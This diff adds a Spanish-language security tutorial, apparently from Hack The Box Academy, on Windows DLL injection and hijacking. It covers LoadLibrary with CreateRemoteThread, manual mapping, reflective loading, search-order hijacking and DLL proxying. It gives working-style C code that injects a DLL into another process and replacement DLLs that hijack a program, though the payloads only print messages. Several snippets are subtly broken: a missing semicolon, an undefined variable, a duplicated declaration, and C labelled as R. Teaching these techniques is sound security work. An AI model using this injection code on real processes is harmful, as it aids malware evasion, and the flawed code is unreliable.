@@ -1,0 +1,344 @@
+`DLL injection` es un método que implica insertar un fragmento de código, estructurado como una Dynamic Link Library (DLL), en un proceso en ejecución. Esta técnica permite que el código insertado se ejecute dentro del contexto del proceso, influyendo así en su comportamiento o accediendo a sus recursos.
+
+`DLL injection` encuentra aplicaciones legítimas en varias áreas. Por ejemplo, los desarrolladores de software utilizan esta tecnología para `hot patching`, un método que permite enmendar o actualizar el código de manera continua, sin la necesidad de reiniciar el proceso en curso de inmediato. Un ejemplo destacado de esto es [Azure's use of hot patching for updating operational servers](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works), que facilita los beneficios de la actualización sin necesitar el tiempo de inactividad del servidor.
+
+Sin embargo, no es completamente inocuo. Los ciberdelincuentes a menudo manipulan `DLL injection` para insertar código malicioso en procesos de confianza. Esta técnica es particularmente efectiva para evadir la detección por parte del software de seguridad.
+
+Existen varios métodos diferentes para ejecutar una inyección de DLL.
+
+## LoadLibrary
+
+`LoadLibrary` es un método ampliamente utilizado para la inyección de DLL, empleando la API `LoadLibrary` para cargar la DLL en el espacio de direcciones del proceso objetivo.
+
+La API `LoadLibrary` es una función proporcionada por el sistema operativo Windows que carga una Dynamic Link Library (DLL) en la memoria del proceso actual y devuelve un handle que se puede usar para obtener las direcciones de las funciones dentro de la DLL.
+
+```r
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Using LoadLibrary to load a DLL into the current process
+    HMODULE hModule = LoadLibrary("example.dll");
+    if (hModule == NULL) {
+        printf("Failed to load example.dll\n");
+        return -1;
+    }
+    printf("Successfully loaded example.dll\n");
+
+    return 0;
+}
+```
+
+El primer ejemplo muestra cómo `LoadLibrary` puede ser utilizado para cargar una DLL en el proceso actual de manera legítima.
+
+```r
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Using LoadLibrary for DLL injection
+    // First, we need to get a handle to the target process
+    DWORD targetProcessId = 123456 // The ID of the target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
+    if (hProcess == NULL) {
+        printf("Failed to open target process\n");
+        return -1;
+    }
+
+    // Next, we need to allocate memory in the target process for the DLL path
+    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    if (dllPathAddressInRemoteMemory == NULL) {
+        printf("Failed to allocate memory in target process\n");
+        return -1;
+    }
+
+    // Write the DLL path to the allocated memory in the target process
+    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
+    if (!succeededWriting) {
+        printf("Failed to write DLL path to target process\n");
+        return -1;
+    }
+
+    // Get the address of LoadLibrary in kernel32.dll
+    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+    if (loadLibraryAddress == NULL) {
+        printf("Failed to get address of LoadLibraryA\n");
+        return -1;
+    }
+
+    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
+    if (hThread == NULL) {
+        printf("Failed to create remote thread in target process\n");
+        return -1;
+    }
+
+    printf("Successfully injected example.dll into target process\n");
+
+    return 0;
+}
+```
+
+El segundo ejemplo ilustra el uso de `LoadLibrary` para la inyección de DLL. Este proceso implica asignar memoria dentro del proceso objetivo para la ruta de la DLL y luego iniciar un hilo remoto que comienza en `LoadLibrary` y se dirige hacia la ruta de la DLL.
+
+## Manual Mapping
+
+`Manual Mapping` es un método increíblemente complejo y avanzado de inyección de DLL. Implica la carga manual de una DLL en la memoria de un proceso y resuelve sus importaciones y relocaciones. Sin embargo, evita la detección fácil al no usar la función `LoadLibrary`, cuyo uso es monitoreado por los sistemas de seguridad y anti-trampa.
+
+Un esquema simplificado del proceso puede representarse de la siguiente manera:
+
+1. Cargar la DLL como datos en bruto en el proceso de inyección.
+2. Mapear las secciones de la DLL en el proceso objetivo.
+3. Inyectar shellcode en el proceso objetivo y ejecutarlo. Este shellcode reubica la DLL, rectifica las importaciones, ejecuta las callbacks de Thread Local Storage (TLS) y finalmente llama a la función principal de la DLL.
+
+## Reflective DLL Injection
+
+`Reflective DLL injection` es una técnica que utiliza la programación reflexiva para cargar una librería desde la memoria en un proceso anfitrión. La librería en sí es responsable de su proceso de carga al implementar un cargador de archivos Portable Executable (PE) mínimo. Esto le permite decidir cómo se cargará e interactuará con el anfitrión, minimizando la interacción con el sistema y proceso anfitrión.
+
+[Stephen Fewer tiene un gran GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) demostrando la técnica. Tomando su explicación a continuación:
+
+"El procedimiento de inyectar remotamente una librería en un proceso tiene dos fases. Primero, la librería que deseas inyectar debe ser escrita en el espacio de direcciones del proceso objetivo (en adelante referido como el 'proceso anfitrión'). Segundo, la librería debe cargarse en el proceso anfitrión para cumplir con las expectativas de tiempo de ejecución de la librería, como resolver sus importaciones o reubicarla en una ubicación adecuada en la memoria.
+
+Asumiendo que tenemos ejecución de código en el proceso anfitrión y la librería que deseamos inyectar ha sido escrita en una ubicación de memoria arbitraria en el proceso anfitrión, la Reflective DLL Injection funciona de la siguiente manera.
+
+1. El control de ejecución se transfiere a la función `ReflectiveLoader` de la librería, una función exportada encontrada en la tabla de exportaciones de la librería. Esto puede suceder ya sea a través de `CreateRemoteThread()` o un shellcode de bootstrap mínimo.
+2. Como la imagen de la librería actualmente reside en una ubicación de memoria arbitraria, el `ReflectiveLoader` inicialmente calcula la ubicación actual de su propia imagen en memoria para analizar sus propios encabezados para uso posterior.
+3. El `ReflectiveLoader` luego analiza la tabla de exportaciones de `kernel32.dll` del proceso anfitrión para calcular las direcciones de tres funciones necesarias por el cargador, a saber, `LoadLibraryA`, `GetProcAddress`, y `VirtualAlloc`.
+4. El `ReflectiveLoader` ahora asigna una región de memoria continua donde procederá a cargar su propia imagen. La ubicación no es crucial; el cargador reubicará correctamente la imagen más tarde.
+5. Los encabezados y secciones de la librería se cargan en sus nuevas ubicaciones de memoria.
+6. El `ReflectiveLoader` luego procesa la copia recién cargada de la tabla de importaciones de su imagen, cargando cualquier librería adicional y resolviendo sus direcciones de función importadas respectivas.
+7. El `ReflectiveLoader` luego procesa la copia recién cargada de la tabla de relocaciones de su imagen.
+8. El `ReflectiveLoader` luego llama a la función de punto de entrada de su imagen recién cargada, `DllMain`, con `DLL_PROCESS_ATTACH`. La librería ahora ha sido cargada exitosamente en la memoria.
+9. Finalmente, el `ReflectiveLoader` devuelve la ejecución al shellcode de bootstrap inicial que lo llamó, o si se llamó a través de `CreateRemoteThread`, el hilo terminaría."
+
+## DLL Hijacking
+
+`DLL Hijacking` es una técnica de explotación donde un atacante se aprovecha del proceso de carga de DLL de Windows. Estas DLL pueden cargarse durante el tiempo de ejecución, creando una oportunidad de secuestro si una aplicación no especifica la ruta completa a una DLL requerida, haciéndola susceptible a tales ataques.
+
+El orden de búsqueda de DLL predeterminado utilizado por el sistema depende de si `Safe DLL Search Mode` está activado. Cuando está habilitado (que es la configuración predeterminada), Safe DLL Search Mode reposiciona el directorio actual del usuario más abajo en el orden de búsqueda. Es fácil habilitar o deshabilitar la configuración editando el registro.
+
+1. Presiona `Windows key + R` para abrir el cuadro de diálogo Ejecutar.
+2. Escribe `Regedit` y presiona `Enter`. Esto abrirá el Editor del Registro.
+3. Navega a `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
+4. En el panel derecho, busca el valor `SafeDllSearchMode`. Si no existe, haz clic derecho en el espacio en blanco de la carpeta o haz clic derecho en la carpeta `Session Manager`, selecciona `New` y luego `DWORD (32-bit) Value`. Nombra este nuevo valor como `SafeDllSearchMode`.
+5. Haz doble clic en `SafeDllSearchMode`. En el campo de datos de valor, ingresa `1` para habilitar y `0` para deshabilitar Safe DLL Search Mode.
+6. Haz clic en `OK`, cierra el Editor del Registro y reinicia el sistema para que los cambios surtan efecto.
+
+Con este modo habilitado, las aplicaciones buscan los archivos DLL necesarios en la siguiente secuencia:
+
+1. El directorio desde el cual se cargó la aplicación.
+2. El directorio del sistema.
+3. El directorio del sistema de 16 bits.
+4. El directorio de Windows.
+5. El directorio actual.
+6. Los directorios que se enumeran en la variable de entorno PATH.
+
+Sin embargo, si 'Safe DLL Search Mode' está desactivado, el orden de búsqueda cambia a:
+
+1. El directorio desde el cual se cargó la aplicación.
+2. El directorio actual.
+3. El directorio del sistema.
+4. El directorio del sistema de 16 bits.
+5. El directorio de Windows.
+6. Los directorios que se enumeran en la variable de entorno PATH.
+
+DLL Hijacking implica unos pasos adicionales. Primero, necesitas identificar una DLL que el objetivo está intentando localizar. Herramientas específicas pueden simplificar esta tarea:
+
+1. `Process Explorer`: Parte del conjunto Sysinternals de Microsoft, esta herramienta ofrece información detallada sobre los procesos en ejecución, incluidas sus DLL cargadas. Al seleccionar un proceso e inspeccionar sus propiedades, puedes ver sus DLL.
+2. `PE Explorer`: Este Portable Executable (PE) Explorer puede abrir y examinar un archivo PE (como un .exe o .dll). Entre otras características, revela las DLL de las que el archivo importa funcionalidad.
+
+Después de identificar una DLL, el siguiente paso es determinar qué funciones deseas modificar, lo cual requiere herramientas de ingeniería inversa, como desensambladores y depuradores. Una vez identificadas las funciones y sus firmas, es hora de construir la DLL.
+
+Tomemos un ejemplo práctico. Considera el siguiente programa en C:
+
+```r
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <windows.h>
+
+typedef int (*AddFunc)(int, int);
+
+int readIntegerInput()
+{
+    int value;
+    char input[100];
+    bool isValid = false;
+
+    while (!isValid)
+    {
+        fgets(input, sizeof(input), stdin);
+
+        if (sscanf(input, "%d", &value) == 1)
+        {
+            isValid = true;
+        }
+        else
+        {
+            printf("Invalid input. Please enter an integer: ");
+        }
+    }
+
+    return value;
+}
+
+int main()
+{
+    HMODULE hLibrary = LoadLibrary("library.dll");
+    if (hLibrary == NULL)
+    {
+        printf("Failed to load library.dll\n");
+        return 1;
+    }
+
+    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
+    if (add == NULL)
+    {
+        printf("Failed to locate the 'Add' function\n");
+        FreeLibrary(hLibrary);
+        return 1;
+    }
+    HMODULE hLibrary = LoadLibrary("x.dll");
+
+    printf("Enter the first number: ");
+    int a = readIntegerInput();
+
+    printf("Enter the second number: ");
+    int b = readIntegerInput();
+
+    int result = add(a, b);
+    printf("The sum of %d and %d is %d\n", a, b, result);
+
+    FreeLibrary(hLibrary);
+    system("pause");
+    return 0;
+}
+```
+
+Carga una función `add` de `library.dll` y utiliza esta función para sumar dos números. Posteriormente, imprime el resultado de la suma. Al examinar el programa en Process Monitor (procmon),
+
+ podemos observar el proceso de carga de `library.dll` ubicado en el mismo directorio.
+
+Primero, establecemos un filtro en procmon para incluir únicamente `main.exe`, que es el nombre del proceso del programa. Este filtro nos ayudará a enfocarnos específicamente en las actividades relacionadas con la ejecución de `main.exe`. Es importante tener en cuenta que procmon solo captura información mientras está activo. Por lo tanto, si tu registro aparece vacío, debes cerrar `main.exe` y reabrirlo mientras procmon está activo. Esto garantizará que se capture la información necesaria para su análisis.
+
+![image](https://academy.hackthebox.com/storage/modules/67/procmon.png)
+
+Luego, si desplazas hacia la parte inferior, puedes ver la llamada para cargar `library.dll`.
+
+![image](https://academy.hackthebox.com/storage/modules/67/procmon-loadimage.png)
+
+Podemos filtrar aún más por una `Operation` de `Load Image` para obtener solo las librerías que la aplicación está cargando.
+
+```r
+16:13:30,0074709	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\main.exe	SUCCESS	Image Base: 0xf60000, Image Size: 0x26000
+16:13:30,0075369	main.exe	47792	Load Image	C:\Windows\System32\ntdll.dll	SUCCESS	Image Base: 0x7ffacdbf0000, Image Size: 0x214000
+16:13:30,0075986	main.exe	47792	Load Image	C:\Windows\SysWOW64\ntdll.dll	SUCCESS	Image Base: 0x77a30000, Image Size: 0x1af000
+16:13:30,0120867	main.exe	47792	Load Image	C:\Windows\System32\wow64.dll	SUCCESS	Image Base: 0x7ffacd5a0000, Image Size: 0x57000
+16:13:30,0122132	main.exe	47792	Load Image	C:\Windows\System32\wow64base.dll	SUCCESS	Image Base: 0x7ffacd370000, Image Size: 0x9000
+16:13:30,0123231	main.exe	47792	Load Image	C:\Windows\System32\wow64win.dll	SUCCESS	Image Base: 0x7ffacc750000, Image Size: 0x8b000
+16:13:30,0124204	main.exe	47792	Load Image	C:\Windows\System32\wow64con.dll	SUCCESS	Image Base: 0x7ffacc850000, Image Size: 0x16000
+16:13:30,0133468	main.exe	47792	Load Image	C:\Windows\System32\wow64cpu.dll	SUCCESS	Image Base: 0x77a20000, Image Size: 0xa000
+16:13:30,0144586	main.exe	47792	Load Image	C:\Windows\SysWOW64\kernel32.dll	SUCCESS	Image Base: 0x76460000, Image Size: 0xf0000
+16:13:30,0146299	main.exe	47792	Load Image	C:\Windows\SysWOW64\KernelBase.dll	SUCCESS	Image Base: 0x75dd0000, Image Size: 0x272000
+16:13:31,7974779	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\library.dll	SUCCESS	Image Base: 0x6a1a0000, Image Size: 0x1d000
+```
+
+### Proxying
+
+Podemos utilizar un método conocido como DLL Proxying para ejecutar un secuestro. Crearemos una nueva librería que cargará la función `Add` de `library.dll`, la manipulará y luego la devolverá a `main.exe`.
+
+1. Crear una nueva librería: Crearemos una nueva librería que servirá como proxy para `library.dll`. Esta librería contendrá el código necesario para cargar la función `Add` de `library.dll` y realizar las manipulaciones necesarias.
+2. Cargar la función `Add`: Dentro de la nueva librería, cargaremos la función `Add` de la `library.dll` original. Esto nos permitirá acceder a la función original.
+3. Manipular la función: Una vez cargada la función `Add`, podemos aplicar las manipulaciones o modificaciones deseadas a su resultado. En este caso, simplemente vamos a modificar el resultado de la suma, agregando `+ 1` al resultado.
+4. Devolver la función modificada: Después de completar el proceso de manipulación, devolveremos la función `Add` modificada de la nueva librería a `main.exe`. Esto asegurará que cuando `main.exe` llame a la función `Add`, ejecutará la versión modificada con los cambios previstos.
+
+El código es el siguiente:
+
+```r
+// tamper.c
+#include <stdio.h>
+#include <Windows.h>
+
+#ifdef _WIN32
+#define DLL_EXPORT __declspec(dllexport)
+#else
+#define DLL_EXPORT
+#endif
+
+typedef int (*AddFunc)(int, int);
+
+DLL_EXPORT int Add(int a, int b)
+{
+    // Load the original library containing the Add function
+    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
+    if (originalLibrary != NULL)
+    {
+        // Get the address of the original Add function from the library
+        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
+        if (originalAdd != NULL)
+        {
+            printf("============ HIJACKED ============\n");
+            // Call the original Add function with the provided arguments
+            int result = originalAdd(a, b);
+            // Tamper with the result by adding +1
+            printf("= Adding 1 to the sum to be evil\n");
+            result += 1;
+            printf("============ RETURN ============\n");
+            // Return the tampered result
+            return result;
+        }
+    }
+    // Return -1 if the original library or function cannot be loaded
+    return -1;
+}
+```
+
+Compílalo o usa la versión precompilada proporcionada. Renombra `library.dll` a `library.o.dll`, y renombra `tamper.dll` a `library.dll`.
+
+Ejecutar `main.exe` luego muestra el hack exitoso.
+
+![image](https://academy.hackthebox.com/storage/modules/67/proxy.png)
+
+### Invalid Libraries
+
+Otra opción para ejecutar un ataque de DLL Hijack es reemplazar una librería válida que el programa está intentando cargar pero no puede encontrar con una librería elaborada. Si cambiamos el filtro de procmon para centrarnos en entradas cuyo camino termine en `.dll` y tenga un estado de `NAME NOT FOUND`, podemos encontrar tales librerías en `main.exe`.
+
+![image](https://academy.hackthebox.com/storage/modules/67/procmon-not-found.png)
+
+Como sabemos, `main.exe` busca en muchos lugares buscando `x.dll`, pero no la encuentra en ningún lado. La entrada en la que estamos particularmente interesados es:
+
+```r
+17:55:39,7848570	main.exe	37940	CreateFile	C:\Users\PandaSt0rm\Desktop\Hijack\x.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
+```
+
+Donde busca cargar `x.dll` desde el directorio de la aplicación. Podemos aprovechar esto y cargar nuestro propio código, con muy poco contexto de lo que está buscando en `x.dll`.
+
+```r
+#include <stdio.h>
+#include <Windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        printf("Hijacked... Oops...\n");
+    }
+    break;
+    case DLL_PROCESS_DETACH:
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+Este código define una función de punto de entrada de DLL llamada `DllMain` que es llamada automáticamente por Windows cuando la DLL se carga en un proceso. Cuando se carga la librería, simplemente imprimirá `Hijacked... Oops...` en la terminal, pero teóricamente podrías hacer cualquier cosa aquí.
+
+Compílalo o usa la versión precompilada proporcionada. Renombra `hijack.dll` a `x.dll`, y ejecuta `main.exe`.
+
+![image](https://academy.hackthebox.com/storage/modules/67/hijack.png)
